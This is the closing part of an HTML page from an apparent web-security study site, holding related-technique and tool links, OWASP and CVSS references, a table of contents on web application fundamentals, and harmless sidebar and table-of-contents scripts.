+<h2 id="related-techniques">Related Techniques</h2>
+<ul>
+<li>HTML Injection</li>
+<li>Sensitive Data Exposure</li>
+<li><a href="/techniques/XSS">XSS</a></li>
+</ul>
+<h2 id="related-tools">Related Tools</h2>
+<ul>
+<li><a href="/tools/Web-Testing/Burp-Suite/Burp-Suite">Burp Suite</a></li>
+<li><a href="/knowledge/Web-Security/Web-Application-Proxies">Web Application Proxies</a></li>
+</ul>
+<hr>
+<h2 id="references--images">References / Images</h2>
+<ul>
+<li>Request and Response</li>
+<li>HTML Snippet</li>
+<li>HTML Injection</li>
+<li>MDN Web Docs — HTML, CSS, JavaScript references</li>
+<li>OWASP Web Security Testing Guide: <a href="https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing">https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing</a></li>
+<li>CVSS User Guide: <a href="https://www.first.org/cvss/user-guide">https://www.first.org/cvss/user-guide</a></li>
+</ul>  </div> </main> <aside class="toc" id="toc" data-astro-cid-o5gmpz7g> <div class="toc-inner" data-astro-cid-o5gmpz7g> <p class="toc-label" data-astro-cid-o5gmpz7g>On this page</p> <aside id="toc-container"> <a href="#overview" class="toc-link toc-h2" data-heading="overview"> Overview </a><a href="#terminology" class="toc-link toc-h2" data-heading="terminology"> Terminology </a><a href="#core-concepts" class="toc-link toc-h2" data-heading="core-concepts"> Core Concepts </a><a href="#web-application-architecture" class="toc-link toc-h3" data-heading="web-application-architecture"> Web Application Architecture </a><a href="#infrastructure-models" class="toc-link toc-h4" data-heading="infrastructure-models"> Infrastructure Models </a><a href="#component-breakdown" class="toc-link toc-h4" data-heading="component-breakdown"> Component Breakdown </a><a href="#3-tier-architecture" class="toc-link toc-h4" data-heading="3-tier-architecture"> 3-Tier Architecture </a><a href="#microservices" class="toc-link toc-h4" data-heading="microservices"> Microservices </a><a href="#serverless" class="toc-link toc-h4" data-heading="serverless"> Serverless </a><a href="#front-end-technologies" class="toc-link toc-h3" data-heading="front-end-technologies"> Front-End Technologies </a><a href="#html-hypertext-markup-language" class="toc-link toc-h4" data-heading="html-hypertext-markup-language"> HTML (HyperText Markup Language) </a><a href="#css-cascading-style-sheets" class="toc-link toc-h4" data-heading="css-cascading-style-sheets"> CSS (Cascading Style Sheets) </a><a href="#javascript-js" class="toc-link toc-h4" data-heading="javascript-js"> JavaScript (JS) </a><a href="#back-end-technologies" class="toc-link toc-h3" data-heading="back-end-technologies"> Back-End Technologies </a><a href="#web-servers" class="toc-link toc-h4" data-heading="web-servers"> Web Servers </a><a href="#common-technology-stacks" class="toc-link toc-h4" data-heading="common-technology-stacks"> Common Technology Stacks </a><a href="#databases" class="toc-link toc-h4" data-heading="databases"> Databases </a><a href="#development-frameworks" class="toc-link toc-h4" data-heading="development-frameworks"> Development Frameworks </a><a href="#security-considerations" class="toc-link toc-h3" data-heading="security-considerations"> Security Considerations </a><a href="#sensitive-data-exposure" class="toc-link toc-h4" data-heading="sensitive-data-exposure"> Sensitive Data Exposure </a><a href="#html-injection" class="toc-link toc-h4" data-heading="html-injection"> HTML Injection </a><a href="#cross-site-request-forgery-csrf" class="toc-link toc-h4" data-heading="cross-site-request-forgery-csrf"> Cross-Site Request Forgery (CSRF) </a><a href="#public-vulnerabilities" class="toc-link toc-h3" data-heading="public-vulnerabilities"> Public Vulnerabilities </a><a href="#cves-common-vulnerabilities-and-exposures" class="toc-link toc-h4" data-heading="cves-common-vulnerabilities-and-exposures"> CVEs (Common Vulnerabilities and Exposures) </a><a href="#cvss-common-vulnerability-scoring-system" class="toc-link toc-h4" data-heading="cvss-common-vulnerability-scoring-system"> CVSS (Common Vulnerability Scoring System) </a> </aside> </div> </aside> <div class="note-spacer" data-astro-cid-o5gmpz7g></div> </div>  </div> </body></html>  <script type="module">const e=document.getElementById("sidebar-toggle"),l=document.getElementById("sidebar");if(e&&l){let a=function(o){o?(l.setAttribute("data-collapsed",""),e.textContent="›",e.style.left="0px"):(l.removeAttribute("data-collapsed"),e.textContent="‹",e.style.left="240px")},t=localStorage.getItem("sidebar")==="1";a(t),e.addEventListener("click",()=>{t=!t,localStorage.setItem("sidebar",t?"1":"0"),a(t)})}</script> <script type="module">window.addEventListener("DOMContentLoaded",()=>{const c=document.querySelectorAll(".toc-link[data-heading]");if(!c.length)return;const d=["related concepts","related techniques","related tools","related playbooks","related knowledge","references","references / images","references/images"],o=Array.from(document.querySelectorAll(".note-content h1, .note-content h2, .note-content h3, .note-content h4")).filter(e=>{if(!e.id)return!1;const t=e.textContent.trim().toLowerCase();return!d.some(n=>t.includes(n))});if(!o.length)return;function r(e){c.forEach(n=>{n.classList.toggle("active",n.dataset.heading===e)});const t=document.querySelector(`.toc-link[data-heading="${e}"]`);t&&t.scrollIntoView({block:"nearest",behavior:"smooth"})}function i(){const e=window.scrollY,t=document.documentElement.scrollHeight,n=window.innerHeight,a=100;if(e+n>=t-10){r(o[o.length-1].id);return}let s=o[0];for(const l of o)l.getBoundingClientRect().top<=a&&(s=l);r(s.id)}window.addEventListener("scroll",i,{passive:!0}),i()});</script>
